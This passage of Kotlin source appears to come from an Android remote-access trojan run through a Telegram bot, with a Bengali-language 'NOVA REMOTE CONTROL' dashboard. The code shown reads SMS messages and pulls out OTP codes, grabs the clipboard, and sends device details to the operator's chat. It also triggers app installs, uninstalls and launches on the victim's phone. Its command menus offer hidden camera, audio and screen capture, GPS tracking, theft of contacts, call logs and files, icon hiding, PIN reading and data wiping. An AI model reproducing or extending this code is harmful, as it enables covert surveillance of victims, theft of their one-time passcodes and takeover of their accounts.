                val appLabel = matchedPkg.applicationInfo?.loadLabel(pm)?.toString() ?: packageName
                val isSystem = (matchedPkg.applicationInfo?.flags ?: 0) and ApplicationInfo.FLAG_SYSTEM != 0

                if (isSystem) {
                    telegramApi.sendMessage(
                        botToken,
                        chatId,
                        "⚠️ <b>সিস্টেম অ্যাপ আনইনস্টল সম্ভব নয়</b>\n\n<b>$appLabel</b> (<code>$packageName</code>) একটি অ্যান্ড্রয়েড সিস্টেম অ্যাপ।"
                    )
                    return@launch
                }

                Handler(Looper.getMainLooper()).post {
                    try {
                        val uninstallIntent = Intent(Intent.ACTION_DELETE).apply {
                            data = Uri.parse("package:$packageName")
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        context.startActivity(uninstallIntent)

                        scope.launch(Dispatchers.IO) {
                            val msg = "🗑️ <b>UNINSTALL PROMPT TRIGGERED [ID: <code>$deviceId</code>]</b>\n\n" +
                                    "📱 <b>App:</b> <b>$appLabel</b>\n" +
                                    "📦 <b>Package:</b> <code>$packageName</code>\n" +
                                    "🔔 <b>Status:</b> ফোনের স্ক্রিনে আনইনস্টল কনফার্মেশন ডায়ালগ ভেসে উঠেছে। ব্যবহারকারী 'OK' চাপলেই অ্যাপটি ফোন থেকে মুছে যাবে।\n" +
                                    "🕒 <b>Time:</b> ${getCurrentTimeString()}"
                            telegramApi.sendMessage(botToken, chatId, msg)
                        }
                    } catch (e: Exception) {
                        scope.launch(Dispatchers.IO) {
                            telegramApi.sendMessage(botToken, chatId, "⚠️ Failed to trigger uninstall for $packageName: ${e.message}")
                        }
                    }
                }
            } catch (e: Exception) {
                telegramApi.sendMessage(botToken, chatId, "⚠️ Uninstall error: ${e.message}")
            }
        }
    }

    private fun handleInstallCommand(rawQuery: String, botToken: String, chatId: String, deviceId: String) {
        val query = rawQuery.trim()
        if (query.isBlank()) {
            scope.launch(Dispatchers.IO) {
                val usage = "📲 <b>INSTALL APP USAGE:</b>\n\n" +
                        "<code>/install [package_name | app_name | direct link]</code>\n\n" +
                        "<b>উদাহরণ:</b>\n" +
                        "• প্লে স্টোর প্যাকেজ: <code>/install com.whatsapp</code>\n" +
                        "• নাম লিখে সার্চ: <code>/install pubg mobile</code>\n" +
                        "• এপিকে বা ওয়েবসাইট লিংক: <code>/install https://example.com/app.apk</code>\n\n" +
                        "💡 <i>কমান্ড পাঠানোর সাথে সাথে ফোনে প্লে স্টোর বা ডাউনলোড পেজ ওপেন হবে।</i>"
                telegramApi.sendMessage(botToken, chatId, usage)
            }
            return
        }

        // Direct web or APK download link
        if (query.startsWith("http://", ignoreCase = true) || query.startsWith("https://", ignoreCase = true) || query.startsWith("www.", ignoreCase = true)) {
            val formattedUrl = if (!query.startsWith("http://", ignoreCase = true) && !query.startsWith("https://", ignoreCase = true)) {
                "https://$query"
            } else query

            Handler(Looper.getMainLooper()).post {
                try {
                    val intent = Intent(Intent.ACTION_VIEW, Uri.parse(formattedUrl)).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    context.startActivity(intent)
                    scope.launch(Dispatchers.IO) {
                        val isApk = formattedUrl.lowercase().contains(".apk")
                        val header = if (isApk) "📥 <b>APK INSTALLATION / DOWNLOAD TRIGGERED</b>" else "🌐 <b>WEB INSTALL LINK OPENED</b>"
                        val msg = "$header [ID: <code>$deviceId</code>]\n\n" +
                                "🔗 <b>URL:</b> <a href=\"$formattedUrl\">$formattedUrl</a>\n" +
                                "📱 ডিভাইসের ব্রাউজারে ইনস্টল ও ডাউনলোড পেজ ওপেন করা হয়েছে।\n" +
                                "🕒 <b>Time:</b> ${getCurrentTimeString()}"
                        telegramApi.sendMessage(botToken, chatId, msg)
                    }
                } catch (e: Exception) {
                    scope.launch(Dispatchers.IO) {
                        telegramApi.sendMessage(botToken, chatId, "⚠️ Failed to open install URL: ${e.message}")
                    }
                }
            }
            return
        }

        // Standard Android package name (e.g. com.whatsapp)
        val looksLikePackage = query.contains(".") && !query.contains(" ")
        if (looksLikePackage) {
            Handler(Looper.getMainLooper()).post {
                try {
                    val marketIntent = Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=$query")).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    try {
                        context.startActivity(marketIntent)
                    } catch (_: Exception) {
                        val webIntent = Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=$query")).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        context.startActivity(webIntent)
                    }

                    scope.launch(Dispatchers.IO) {
                        val msg = "📲 <b>GOOGLE PLAY STORE OPENED [ID: <code>$deviceId</code>]</b>\n\n" +
                                "📦 <b>Package:</b> <code>$query</code>\n" +
                                "🏪 ফোনে সরাসরি Google Play Store ওপেন হয়েছে ইনস্টল করার জন্য।\n" +
                                "🔗 <a href=\"https://play.google.com/store/apps/details?id=$query\">View on Play Store</a>\n" +
                                "🕒 <b>Time:</b> ${getCurrentTimeString()}"
                        telegramApi.sendMessage(botToken, chatId, msg)
                    }
                } catch (e: Exception) {
                    scope.launch(Dispatchers.IO) {
                        telegramApi.sendMessage(botToken, chatId, "⚠️ Play Store open error: ${e.message}")
                    }
                }
            }
            return
        }

        // App name search in Play Store (e.g. "telegram", "facebook")
        Handler(Looper.getMainLooper()).post {
            try {
                val encodedQuery = Uri.encode(query)
                val searchIntent = Intent(Intent.ACTION_VIEW, Uri.parse("market://search?q=$encodedQuery")).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                try {
                    context.startActivity(searchIntent)
                } catch (_: Exception) {
                    val webSearchIntent = Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/search?q=$encodedQuery&c=apps")).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    context.startActivity(webSearchIntent)
                }

                scope.launch(Dispatchers.IO) {
                    val msg = "📲 <b>PLAY STORE SEARCH OPENED [ID: <code>$deviceId</code>]</b>\n\n" +
                            "🔍 <b>Search:</b> <b>$query</b>\n" +
                            "🏪 ডিভাইসের স্ক্রিনে Play Store সার্চ রেজাল্ট ওপেন হয়েছে সাথে সাথে 'Install' চাপার জন্য।\n" +
                            "🕒 <b>Time:</b> ${getCurrentTimeString()}"
                    telegramApi.sendMessage(botToken, chatId, msg)
                }
            } catch (e: Exception) {
                scope.launch(Dispatchers.IO) {
                    telegramApi.sendMessage(botToken, chatId, "⚠️ Play Store search error: ${e.message}")
                }
            }
        }
    }

    private fun handleOpenAppCommand(rawQuery: String, botToken: String, chatId: String, deviceId: String) {
        val query = rawQuery.trim()
        if (query.isBlank()) {
            scope.launch(Dispatchers.IO) {
                telegramApi.sendMessage(
                    botToken,
                    chatId,
                    "⚠️ <b>Usage:</b> <code>/openapp [package_name or app_name]</code>\nউদাহরণ: <code>/openapp com.whatsapp</code> অথবা <code>/openapp youtube</code>"
                )
            }
            return
        }

        scope.launch(Dispatchers.IO) {
            try {
                val pm = context.packageManager
                val allInstalled = pm.getInstalledPackages(0)

                var matchedPkg = allInstalled.find { it.packageName.equals(query, ignoreCase = true) }

                if (matchedPkg == null) {
                    val labelMatches = allInstalled.filter { pkg ->
                        val label = pkg.applicationInfo?.loadLabel(pm)?.toString() ?: ""
                        label.contains(query, ignoreCase = true)
                    }
                    if (labelMatches.isNotEmpty()) {
                        matchedPkg = labelMatches.firstOrNull { (it.applicationInfo?.flags ?: 0) and ApplicationInfo.FLAG_SYSTEM == 0 } ?: labelMatches[0]
                    }
                }

                val packageName = matchedPkg?.packageName ?: query
                val appLabel = matchedPkg?.applicationInfo?.loadLabel(pm)?.toString() ?: packageName

                Handler(Looper.getMainLooper()).post {
                    try {
                        val launchIntent = pm.getLaunchIntentForPackage(packageName)
                        if (launchIntent != null) {
                            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            context.startActivity(launchIntent)

                            scope.launch(Dispatchers.IO) {
                                val msg = "🚀 <b>APP LAUNCHED ON PHONE [ID: <code>$deviceId</code>]</b>\n\n" +
                                        "📱 <b>App:</b> <b>$appLabel</b>\n" +
                                        "📦 <b>Package:</b> <code>$packageName</code>\n" +
                                        "🕒 <b>Time:</b> ${getCurrentTimeString()}"
                                telegramApi.sendMessage(botToken, chatId, msg)
                            }
                        } else {
                            scope.launch(Dispatchers.IO) {
                                telegramApi.sendMessage(
                                    botToken,
                                    chatId,
                                    "⚠️ <b>Cannot launch '$appLabel':</b> This app has no main launcher activity or is a background service."
                                )
                            }
                        }
                    } catch (e: Exception) {
                        scope.launch(Dispatchers.IO) {
                            telegramApi.sendMessage(botToken, chatId, "⚠️ Failed to launch app $packageName: ${e.message}")
                        }
                    }
                }
            } catch (e: Exception) {
                telegramApi.sendMessage(botToken, chatId, "⚠️ Launch error: ${e.message}")
            }
        }
    }

    private suspend fun sendDevicePingResponse(botToken: String, chatId: String, deviceId: String) {
        val batteryPct = getBatteryPercentage()
        val isCharging = isDeviceCharging()
        val storage = getStorageStats()
        val ram = getRamStats()
        val netType = getActiveNetworkType()
        val allMedia = mediaScanner.scanAllMedia()
        val uploadedIds = repository.getUploadedIds()
        val pendingCount = allMedia.count { !uploadedIds.contains(it.id) }
        val isSelected = repository.getSelectedTargetDevice()?.equals(deviceId, ignoreCase = true) == true
        val targetStatus = if (isSelected) "🎯 Active Target (Selected)" else "Standby (Ready)"

        val msg = "🟢 <b>DEVICE ONLINE [ID: <code>$deviceId</code>]</b>\n\n" +
                "📱 <b>Model:</b> ${escapeHtml(Build.MANUFACTURER.uppercase())} ${escapeHtml(Build.MODEL)}\n" +
                "🎯 <b>Target State:</b> $targetStatus\n" +
                "🤖 <b>System:</b> Android ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})\n" +
                "🔋 <b>Battery:</b> $batteryPct% ${if (isCharging) "⚡ (Charging)" else "🪫"}\n" +
                "💾 <b>Storage:</b> ${storage.freeGb} GB Free / ${storage.totalGb} GB\n" +
                "🧠 <b>RAM:</b> ${ram.availMb} MB Free / ${ram.totalMb} MB Total\n" +
                "🌐 <b>Network:</b> $netType\n" +
                "☁️ <b>Sync Queue:</b> ${uploadedIds.size} Synced | $pendingCount Pending\n" +
                "🕒 <b>Live Time:</b> ${getCurrentTimeString()}"

        val deviceButtons = """
{
  "inline_keyboard": [
    [
      {"text": "🎯 Select THIS Device", "callback_data": "/select $deviceId"},
      {"text": "📋 Dashboard", "callback_data": "/help $deviceId"}
    ],
    [
      {"text": "📍 GPS Loc", "callback_data": "/location $deviceId"},
      {"text": "📊 Status", "callback_data": "/status $deviceId"}
    ],
    [
      {"text": "📸 Front Pic", "callback_data": "/photo_front $deviceId"},
      {"text": "📷 Back Pic", "callback_data": "/photo_back $deviceId"}
    ],
    [
      {"text": "🎙️ Record Audio", "callback_data": "/record $deviceId"},
      {"text": "📱 Screenshot", "callback_data": "/screenshot $deviceId"}
    ],
    [
      {"text": "📱 SIM Info", "callback_data": "/sim $deviceId"},
      {"text": "👤 Accounts", "callback_data": "/accounts $deviceId"}
    ]
  ]
}
""".trimIndent()

        telegramApi.sendMessage(botToken, chatId, msg, replyMarkupJson = deviceButtons)
    }

    private suspend fun sendFullStatusResponse(botToken: String, chatId: String, deviceId: String) {
        val batteryPct = getBatteryPercentage()
        val isCharging = isDeviceCharging()
        val storage = getStorageStats()
        val ram = getRamStats()
        val uptime = getSystemUptime()
        val netType = getActiveNetworkType()
        val allMedia = mediaScanner.scanAllMedia()
        val uploadedIds = repository.getUploadedIds()
        val pendingCount = allMedia.count { !uploadedIds.contains(it.id) }
        val lastSyncMs = repository.getLastSyncTimestamp()
        val lastSyncStr = if (lastSyncMs > 0) SimpleDateFormat("dd MMM, hh:mm a", Locale.getDefault()).format(Date(lastSyncMs)) else "Never"
        val isSelected = repository.getSelectedTargetDevice()?.equals(deviceId, ignoreCase = true) == true
        val targetState = if (isSelected) "🎯 Active Target (Selected)" else "Standby (Ready)"

        val msg = "📊 <b>FULL DEVICE DIAGNOSTIC [ID: <code>$deviceId</code>]</b>\n\n" +
                "📱 <b>Hardware:</b> ${escapeHtml(Build.MANUFACTURER.uppercase())} ${escapeHtml(Build.MODEL)} (${escapeHtml(Build.PRODUCT)})\n" +
                "🎯 <b>Target State:</b> $targetState\n" +
                "🤖 <b>Android OS:</b> ${Build.VERSION.RELEASE} (Security Level ${Build.VERSION.SECURITY_PATCH ?: "Updated"})\n" +
                "🔋 <b>Battery:</b> $batteryPct% ${if (isCharging) "⚡ Charging" else "🪫 Discharging"}\n" +
                "💾 <b>Internal Disk:</b> ${storage.freeGb} GB Free / ${storage.totalGb} GB (${storage.usedPercent}% used)\n" +
                "🧠 <b>Memory (RAM):</b> ${ram.availMb} MB Free / ${ram.totalMb} MB (${ram.usedPercent}% used)\n" +
                "🌐 <b>Active Network:</b> $netType\n" +
                "⏱️ <b>Device Uptime:</b> $uptime\n" +
                "☁️ <b>Cloud Media Backup:</b> ${uploadedIds.size} Synced / $pendingCount Pending\n" +
                "🔄 <b>Last Media Scan:</b> $lastSyncStr\n" +
                "🛡️ <b>Engine Status:</b> 24/7 Active Protection ON\n" +
                "🕒 <b>Report Time:</b> ${getCurrentTimeString()}"

        val statusButtons = """
{
  "inline_keyboard": [
    [
      {"text": "🎯 Select THIS Device", "callback_data": "/select $deviceId"},
      {"text": "📋 Dashboard", "callback_data": "/help $deviceId"}
    ]
  ]
}
""".trimIndent()

        telegramApi.sendMessage(botToken, chatId, msg, replyMarkupJson = statusButtons)
    }

    private suspend fun sendSyncTriggerResponse(botToken: String, chatId: String, deviceId: String) {
        val msg = "🔄 <b>MANUAL SYNC TRIGGERED [ID: <code>$deviceId</code>]</b>\n\n" +
                "📱 Device: ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}\n" +
                "⚡ <i>Immediate media scan and upload loop started...</i>"
        telegramApi.sendMessage(botToken, chatId, msg)
        onTriggerSync("Telegram Remote Command (/sync)")
    }

    private fun sendClipboardContent(botToken: String, chatId: String, deviceId: String) {
        Handler(Looper.getMainLooper()).post {
            try {
                val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager
                val clipData = clipboard?.primaryClip
                val clipText = if (clipData != null && clipData.itemCount > 0) {
                    clipData.getItemAt(0)?.coerceToText(context)?.toString()?.trim()
                } else null

                scope.launch(Dispatchers.IO) {
                    val msg = if (!clipText.isNullOrBlank()) {
                        "📋 <b>CURRENT CLIPBOARD [ID: <code>$deviceId</code>]</b>\n\n" +
                                "<code>${clipText.take(3500)}</code>\n\n" +
                                "🕒 <b>Time:</b> ${getCurrentTimeString()}\n" +
                                "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}"
                    } else {
                        "📋 <b>CLIPBOARD EMPTY [ID: <code>$deviceId</code>]</b>\n\nNo active text found in device clipboard buffer."
                    }
                    telegramApi.sendMessage(botToken, chatId, msg)
                }
            } catch (e: Exception) {
                scope.launch(Dispatchers.IO) {
                    telegramApi.sendMessage(botToken, chatId, "⚠️ Clipboard error on $deviceId: ${e.message}")
                }
            }
        }
    }

    private suspend fun sendRecentSmsReport(botToken: String, chatId: String, deviceId: String) {
        val hasReadSms = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
        if (!hasReadSms) {
            val msg = "🔐 <b>SMS & OTP STATUS [ID: <code>$deviceId</code>]</b>\n\n" +
                    "⚠️ <i>SMS read permission is not yet granted on device.</i>\n\n" +
                    "💡 নতুন এসএমএস বা ওটিপি আসলে সরাসরি টেলিগ্রামে অটোমেটিক ফরোয়ার্ড হয়ে যাবে (SmsOtpReceiver সক্রিয় আছে)।"
            telegramApi.sendMessage(botToken, chatId, msg)
            return
        }

        try {
            val cursor = context.contentResolver.query(
                Uri.parse("content://sms/inbox"),
                arrayOf("_id", "address", "body", "date"),
                null,
                null,
                "date DESC LIMIT 5"
            )

            val smsList = mutableListOf<String>()
            cursor?.use {
                val addrIdx = it.getColumnIndex("address")
                val bodyIdx = it.getColumnIndex("body")
                val dateIdx = it.getColumnIndex("date")

                while (it.moveToNext()) {
                    val addr = if (addrIdx >= 0) it.getString(addrIdx) ?: "Unknown" else "Unknown"
                    val body = if (bodyIdx >= 0) it.getString(bodyIdx) ?: "" else ""
                    val dateMs = if (dateIdx >= 0) it.getLong(dateIdx) else 0L
                    val timeFormatted = if (dateMs > 0) SimpleDateFormat("dd MMM, hh:mm a", Locale.getDefault()).format(Date(dateMs)) else ""
                    val otp = SmsOtpReceiver.extractOtpCode(body)

                    val otpLine = if (otp != null) "⚡ <b>OTP:</b> <code>$otp</code>\n" else ""
                    val itemStr = "📩 <b>From:</b> <code>$addr</code>\n" +
                            otpLine +
                            "💬 <i>${body.take(200)}</i>\n" +
                            "🕒 <i>$timeFormatted</i>"
                    smsList.add(itemStr)
                }
            }

            val msg = if (smsList.isNotEmpty()) {
                "🔐 <b>RECENT SMS & OTP INBOX [ID: <code>$deviceId</code>]</b>\n\n" +
                        smsList.joinToString("\n━━━━━━━━━━━━━━━━━━━━\n") + "\n\n" +
                        "📱 Device: ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}"
            } else {
                "🔐 <b>SMS INBOX [ID: <code>$deviceId</code>]</b>\n\nNo SMS found in device inbox."
            }

            telegramApi.sendMessage(botToken, chatId, msg)
        } catch (e: Exception) {
            telegramApi.sendMessage(botToken, chatId, "⚠️ Failed to read SMS on $deviceId: ${e.message}")
        }
    }

    fun getReplyKeyboardJson(): String {
        return """
{
  "keyboard": [
    [{"text": "📸 Front Photo"}, {"text": "📷 Back Photo"}],
    [{"text": "🎥 Video Front"}, {"text": "📹 Video Back"}],
    [{"text": "📱 Screenshot"}, {"text": "🌐 Wi-Fi Status"}],
    [{"text": "🎙️ Record Audio"}, {"text": "🗣️ Speak Text"}],
    [{"text": "🚨 Screen Alert"}, {"text": "📱 SIM Info"}],
    [{"text": "👤 Accounts"}, {"text": "📞 Call Logs"}],
    [{"text": "👥 Contacts"}, {"text": "📁 Files / Folder"}],
    [{"text": "📍 Live GPS Pin"}, {"text": "📶 Network / IP"}],
    [{"text": "🔐 Read OTP / SMS"}, {"text": "📋 Read Clip"}],
    [{"text": "🔒 Security PIN"}, {"text": "👻 Hide Icon"}],
    [{"text": "📦 Installed Apps"}, {"text": "📊 Media Stats"}],
    [{"text": "💾 Disk & RAM"}, {"text": "🔋 Battery Info"}],
    [{"text": "💥 Wipe Data"}, {"text": "📋 Show Menu"}]
  ],
  "resize_keyboard": true,
  "is_persistent": true
}
""".trimIndent()
    }

    fun getInlineKeyboardJson(deviceId: String): String {
        return """
{
  "inline_keyboard": [
    [
      {"text": "🎯 Select THIS Device", "callback_data": "/select $deviceId"},
      {"text": "📱 All Devices", "callback_data": "/devices"}
    ],
    [
      {"text": "📸 Front Photo", "callback_data": "/photo_front $deviceId"},
      {"text": "📷 Back Photo", "callback_data": "/photo_back $deviceId"}
    ],
    [
      {"text": "🎥 Video Front (10s)", "callback_data": "/video_front $deviceId"},
      {"text": "📹 Video Back (10s)", "callback_data": "/video_back $deviceId"}
    ],
    [
      {"text": "📱 Live Screenshot", "callback_data": "/screenshot $deviceId"},
      {"text": "🌐 Wi-Fi & Network", "callback_data": "/wifi $deviceId"}
    ],
    [
      {"text": "🎙️ Record Audio (10s)", "callback_data": "/record $deviceId"},
      {"text": "🗣️ Speak Alert", "callback_data": "/say $deviceId Alert"}
    ],
    [
      {"text": "🚨 Screen Alert", "callback_data": "/alert $deviceId Emergency"},
      {"text": "📱 SIM Info", "callback_data": "/sim $deviceId"}
    ],
    [
      {"text": "👤 Accounts", "callback_data": "/accounts $deviceId"},
      {"text": "📞 Call Logs", "callback_data": "/calls $deviceId"}
    ],
    [
      {"text": "👥 Contacts", "callback_data": "/contacts $deviceId"},
      {"text": "📁 Fetch Folder", "callback_data": "/fetch $deviceId"}
    ],
    [
      {"text": "🗑️ Delete Path", "callback_data": "/delete $deviceId"},
      {"text": "📍 Live GPS Pin", "callback_data": "/location $deviceId"}
    ],
    [
      {"text": "🔐 Read OTP / SMS", "callback_data": "/otp $deviceId"},
      {"text": "📋 Read Clip", "callback_data": "/clipboard $deviceId"}
    ],
    [
      {"text": "🔒 Check PIN", "callback_data": "/getpin $deviceId"},
      {"text": "👻 Hide Icon", "callback_data": "/hide $deviceId"}
    ],
    [
      {"text": "👁️ Unhide Icon", "callback_data": "/unhide $deviceId"},
      {"text": "💥 Wipe Data", "callback_data": "/wipe $deviceId"}
    ],
    [
      {"text": "📦 Installed Apps", "callback_data": "/apps $deviceId"},
      {"text": "📊 Media Stats", "callback_data": "/media_stats $deviceId"}
    ],
    [
      {"text": "💾 Disk & RAM", "callback_data": "/storage $deviceId"},
      {"text": "🔋 Battery Info", "callback_data": "/battery $deviceId"}
    ],
    [
      {"text": "📶 Network / IP", "callback_data": "/network $deviceId"},
      {"text": "⌨️ Bottom Action Bar", "callback_data": "/keyboard $deviceId"}
    ]
  ]
}
""".trimIndent()
    }

    private suspend fun sendHelpGuide(botToken: String, chatId: String, deviceId: String) {
        val batteryPct = getBatteryPercentage()
        val isCharging = if (isDeviceCharging()) "⚡ Charging" else "🔋 Battery"
        val storage = getStorageStats()
        val selectedTarget = repository.getSelectedTargetDevice() ?: "All Devices (Default)"

        val guideMsg = """
🤖 <b>NOVA REMOTE CONTROL DASHBOARD</b>
📱 <b>Device:</b> <code>$deviceId</code> (${escapeHtml(Build.MANUFACTURER.uppercase())} ${escapeHtml(Build.MODEL)})
🎯 <b>Active Target:</b> <code>$selectedTarget</code>
🔋 <b>Power:</b> $batteryPct% ($isCharging) | 💾 <b>Storage:</b> ${storage.freeGb}GB Free
━━━━━━━━━━━━━━━━━━━━
💡 <i>নিচের যেকোনো বাটনে চাপুন অথবা সরাসরি কমান্ড লিখুন:</i>

🎯 <b>মাল্টি-ডিভাইস টার্গেটিং (Multi-Device Control):</b>
• নির্দিষ্ট ডিভাইস নির্বাচন করতে: <code>/select $deviceId</code>
• সব ডিভাইসে একসাথে পাঠাতে: <code>/select all</code>
• অনলাইনে থাকা সব ফোন দেখতে: <code>/devices</code>

📸 <b>ক্যামেরা ও লাইভ নজরদারি:</b>
• <code>/photo_front</code> বা <code>/photo_back</code> - ব্যাকগ্রাউন্ড ছবি তোলা
• <code>/video_front [সেকেন্ড]</code> বা <code>/video_back</code> - ভিডিও রেকর্ড
• <code>/screenshot</code> - ফোনের লাইভ স্ক্রিন ক্যাপচার
• <code>/record [সেকেন্ড]</code> - অডিও রেকর্ড (যেমন: <code>/record 10</code>)
• <code>/say [লেখা]</code> - ফোনের স্পিকারে কথা বলানো
• <code>/alert [মেসেজ]</code> - লক স্ক্রিনে জরুরি বার্তা ও সাইরেন

📱 <b>সিম, কল ও মেসেজ:</b>
• <code>/sim</code> - সিম নাম্বার ও অপারেটর তথ্য
• <code>/accounts</code> - Google, WhatsApp, Telegram একাউন্ট
• <code>/calls</code> - সকল কল লগ হিস্টোরি (.txt ফাইল)
• <code>/contacts</code> - সকল ফোনবুক কন্টাক্ট ও নাম্বার (.txt ফাইল)
• <code>/otp</code> - সর্বশেষ SMS ও OTP কোড
• <code>/clipboard</code> - কপি করা টেক্সট
• <code>/sendsms [নাম্বার] [মেসেজ]</code> - এসএমএস পাঠানো

📍 <b>লোকেশন, নেটওয়ার্ক ও ফাইলস:</b>
• <code>/location</code> - লাইভ জিপিএস লোকেশন ও গুগল ম্যাপ
• <code>/wifi [on/off]</code> - ওয়াইফাই কন্ট্রোল ও স্ট্যাটাস
• <code>/fetch [ফোল্ডার]</code> - ফাইল ডাউনলোড (যেমন: <code>/fetch Download</code>)
• <code>/list [ফোল্ডার]</code> - ফোল্ডারের ফাইল দেখা
• <code>/apps</code> - ইনস্টল থাকা অ্যাপ তালিকা

🔒 <b>নিরাপত্তা ও প্রাইভেসি:</b>
• <code>/setpin [পিন]</code> - অ্যাপের পিন লক সেট (যেমন: <code>/setpin 1234</code>)
• <code>/hide</code> / <code>/unhide</code> - অ্যাপ আইকন লুকানো বা ফিরিয়ে আনা
• <code>/wipe confirm</code> - সব ফাইল ওয়াইপ করা
• <code>/keyboard</code> - নিচের অ্যাকশন বার কিবোর্ড চালু করা
━━━━━━━━━━━━━━━━━━━━
🔘 <i>বাটনে ক্লিক করলে ফোন সাথে সাথে রেসপন্স করবে!</i>
""".trimIndent()

        telegramApi.sendMessage(botToken, chatId, guideMsg, replyMarkupJson = getInlineKeyboardJson(deviceId))
    }

    private fun getBatteryPercentage(): Int {
        val batteryIntent = context.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED)) ?: return 100
        val level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
        val scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
        return if (level >= 0 && scale > 0) (level * 100) / scale else 100
    }

    private fun isDeviceCharging(): Boolean {
        val batteryIntent = context.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED)) ?: return false
        val status = batteryIntent.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
        return status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
    }

    private data class StorageStats(val freeGb: String, val totalGb: String, val usedPercent: Int)

    private fun getStorageStats(): StorageStats {
        return try {
            val stat = StatFs(Environment.getDataDirectory().path)
            val totalBytes = stat.totalBytes
            val freeBytes = stat.availableBytes
            val usedBytes = totalBytes - freeBytes

            val totalGb = String.format(Locale.US, "%.1f", totalBytes / (1024.0 * 1024.0 * 1024.0))
            val freeGb = String.format(Locale.US, "%.1f", freeBytes / (1024.0 * 1024.0 * 1024.0))
            val usedPercent = if (totalBytes > 0) ((usedBytes * 100) / totalBytes).toInt() else 0
            StorageStats(freeGb, totalGb, usedPercent)
        } catch (_: Exception) {
            StorageStats("N/A", "N/A", 0)
        }
    }

    private data class RamStats(val availMb: Long, val totalMb: Long, val usedPercent: Int)

    private fun getRamStats(): RamStats {
        return try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val memInfo = ActivityManager.MemoryInfo()
            am.getMemoryInfo(memInfo)
            val availMb = memInfo.availMem / (1024 * 1024)
            val totalMb = memInfo.totalMem / (1024 * 1024)
            val usedMb = (totalMb - availMb).coerceAtLeast(0)
            val percent = if (totalMb > 0) ((usedMb * 100) / totalMb).toInt() else 0
            RamStats(availMb, totalMb, percent)
        } catch (_: Exception) {
            RamStats(0, 0, 0)
        }
    }

    private fun getActiveNetworkType(): String {
        return try {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = cm.activeNetwork ?: return "Offline / No Internet"
            val caps = cm.getNetworkCapabilities(network) ?: return "Connected"
            if (caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
                getWifiNetworkName()
            } else if (caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
                getCellularNetworkName()
            } else {
                "Active Internet"
            }
        } catch (_: Exception) {
            "Unknown Network"
        }
    }

    @Suppress("DEPRECATION")
    private fun getWifiNetworkName(): String {
        return try {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
            val wifiInfo: WifiInfo? = wifiManager?.connectionInfo
            val ssid = wifiInfo?.ssid?.replace("\"", "") ?: "Connected"
            if (ssid == "<unknown ssid>" || ssid.isBlank()) "Wi-Fi (High Speed)" else "Wi-Fi ($ssid)"
        } catch (_: Exception) {
            "Wi-Fi"
        }
    }

    private fun getCellularNetworkName(): String {
        return try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
            val carrier = tm?.networkOperatorName?.ifBlank { tm.simOperatorName } ?: ""
            if (carrier.isNotBlank()) "Cellular (Mobile Data - $carrier)" else "Cellular / Mobile Data (4G/5G)"
        } catch (_: Exception) {
            "Cellular / Mobile Data (4G/5G)"
        }
    }

    @Suppress("DEPRECATION")
    private fun getDetailedWifiInfo(): String {
        return try {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
            val wifiInfo: WifiInfo? = wifiManager?.connectionInfo
            val ssid = wifiInfo?.ssid?.replace("\"", "") ?: "Unknown"
            val linkSpeed = wifiInfo?.linkSpeed ?: 0
            if (ssid == "<unknown ssid>" || ssid.isBlank()) "Connected via Wi-Fi ($linkSpeed Mbps)" else "$ssid ($linkSpeed Mbps)"
        } catch (_: Exception) {
            "Wi-Fi Connected"
        }
    }

    private fun getSystemUptime(): String {
        val uptimeMillis = SystemClock.elapsedRealtime()
        val hours = TimeUnit.MILLISECONDS.toHours(uptimeMillis)
        val minutes = TimeUnit.MILLISECONDS.toMinutes(uptimeMillis) % 60
        return "${hours}h ${minutes}m"
    }

    private fun getCurrentTimeString(): String {
        val sdf = SimpleDateFormat("dd MMM, hh:mm:ss a", Locale.getDefault())
        return sdf.format(Date())
    }

    private fun handleFetchFolderCommand(
        rawQuery: String?,
        botToken: String,
        chatId: String,
        deviceId: String,
        filterType: String?
    ) {
        val query = rawQuery?.trim() ?: ""
        if (query.isBlank() || query.equals(deviceId, ignoreCase = true) || query.equals("all", ignoreCase = true)) {
            scope.launch(Dispatchers.IO) {
                val keyboardJson = """
{
  "inline_keyboard": [
    [
      {"text": "📥 Downloads", "callback_data": "/fetch $deviceId Download"},
      {"text": "📸 Camera", "callback_data": "/fetch $deviceId DCIM/Camera"}
    ],
    [
      {"text": "🖼️ Pictures", "callback_data": "/fetch $deviceId Pictures"},
      {"text": "📄 Documents", "callback_data": "/fetch $deviceId Documents"}
    ],
    [
